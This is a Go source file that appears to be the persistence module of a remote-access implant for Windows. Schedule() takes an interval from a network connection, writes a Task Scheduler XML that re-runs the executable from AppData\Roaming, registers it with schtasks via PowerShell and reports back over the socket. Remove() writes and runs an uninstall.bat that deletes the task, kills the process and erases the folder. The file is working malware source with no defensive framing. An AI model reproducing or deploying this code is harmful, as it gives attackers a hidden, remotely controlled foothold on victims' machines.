package persist

import (
	"bufio"
	//"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func Schedule(connection net.Conn) (err error) {

	reader := bufio.NewReader(connection)
	command_raw, err := reader.ReadString('\n')
	command := strings.TrimSpace(command_raw)
	fmt.Println(command)

	home, _ := os.UserHomeDir()

	exe_name := filepath.Base(os.Args[0])
	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]
	appdata := filepath.Join(home, "AppData\\Roaming", without_ext)
	xml_path := appdata + "\\schtask.xml"
	folder_path := filepath.Join(home, "AppData\\Roaming", without_ext)

	if _, err := os.Stat(folder_path); os.IsNotExist(err) {
		e := os.Mkdir(without_ext, 0755) //mkdir jack
		if e != nil {
			panic(e)
		}
		goto ELSE
	}
	goto ELSE

ELSE:
	c1 := os.Chdir(folder_path) //cd appdata/Roaming/jack
	if c1 != nil {
		panic(c1)
	}

	xml_data := "<?xml version=\"1.0\" encoding=\"UTF-16\"?>" +
		"\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" +
		"\n  <RegistrationInfo>" +
		"\n  </RegistrationInfo>" +
		"\n  <Triggers>" +
		"\n    <TimeTrigger>" +
		"\n      <Repetition>" +
		"\n        <Interval>PT" + command + "M</Interval>" +
		"\n        <StopAtDurationEnd>false</StopAtDurationEnd>" +
		"\n      </Repetition>" +
		"\n      <StartBoundary>2015-05-06T23:24:00</StartBoundary>" +
		"\n      <Enabled>true</Enabled>" +
		"\n    </TimeTrigger>" +
		"\n  </Triggers>" +
		"\n  <Principals>" +
		"\n    <Principal id=\"Author\">" +
		"\n      <LogonType>InteractiveToken</LogonType>" +
		"\n      <RunLevel>LeastPrivilege</RunLevel>" +
		"\n    </Principal>" +
		"\n  </Principals>" +
		"\n  <Settings>" +
		"\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" +
		"\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" +
		"\n    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>" +
		"\n    <AllowHardTerminate>true</AllowHardTerminate>" +
		"\n    <StartWhenAvailable>false</StartWhenAvailable>" +
		"\n    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>" +
		"\n    <IdleSettings>" +
		"\n      <StopOnIdleEnd>true</StopOnIdleEnd>" +
		"\n      <RestartOnIdle>false</RestartOnIdle>" +
		"\n    </IdleSettings>" +
		"\n    <AllowStartOnDemand>true</AllowStartOnDemand>" +
		"\n    <Enabled>true</Enabled>" +
		"\n    <Hidden>false</Hidden>" +
		"\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>" +
		"\n    <WakeToRun>false</WakeToRun>" +
		"\n    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>" +
		"\n    <Priority>7</Priority>	" +
		"\n  </Settings>" +
		"\n  <Actions Context=\"Author\">" +
		"\n    <Exec>" +
		"\n      <Command>" + filepath.Join(folder_path, exe_name) + "</Command>" +
		"\n    </Exec>" +
		"\n  </Actions>" +
		"\n</Task>"

	file, err := os.Create("schtask.xml")

	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	_, err2 := file.Write([]byte(xml_data))
	if err2 != nil {
		log.Fatal(err2)
	}
	err = file.Close()

	c := exec.Command("powershell", "schtasks", "/DELETE", "/TN", without_ext, "/F")
	if err := c.Run(); err != nil {
		fmt.Println("Error: ", err)
	}

	c2 := exec.Command("powershell", "SCHTASKS", "/create", "/TN", without_ext, "/xml", xml_path)
	if err := c2.Run(); err != nil {
		fmt.Println("Error: ", err)
	}

	nbytes, err := connection.Write([]byte("[#] xml written\n"))
	if err != nil {
		panic(err)
	}
	fmt.Println("[+]", nbytes, "bytes written")

	return
}

func Remove(connection net.Conn) (err error) {

	exe_name := filepath.Base(os.Args[0])
	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]
	home, _ := os.UserHomeDir()
	appdata := filepath.Join(home, "AppData\\Roaming", without_ext)
	//appdata_with_exe := appdata + "\\" + exe_name
	//xml_path := appdata + "\\schtask.xml"

	content := "powershell -command \"Start-Sleep -s 5\"" + "\n" +
		"schtasks /DELETE /TN " + without_ext + " /F" + "\n" +
		"taskkill /im " + exe_name + " /f" + "\n" +
		"Start-Sleep -s 10" + "\n" +
		"del " + appdata + "/f /q"

	file, err := os.Create("uninstall.bat")

	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	_, err2 := file.Write([]byte(content))
	if err2 != nil {
		log.Fatal(err2)
	}
	err = file.Close()

	c2 := exec.Command("powershell", "Start-Sleep", "-Seconds", "5", ";", "./uninstall.bat")
	if err := c2.Run(); err != nil {
		fmt.Println("Error: ", err)
	}
	return
}

func disarm() {

}
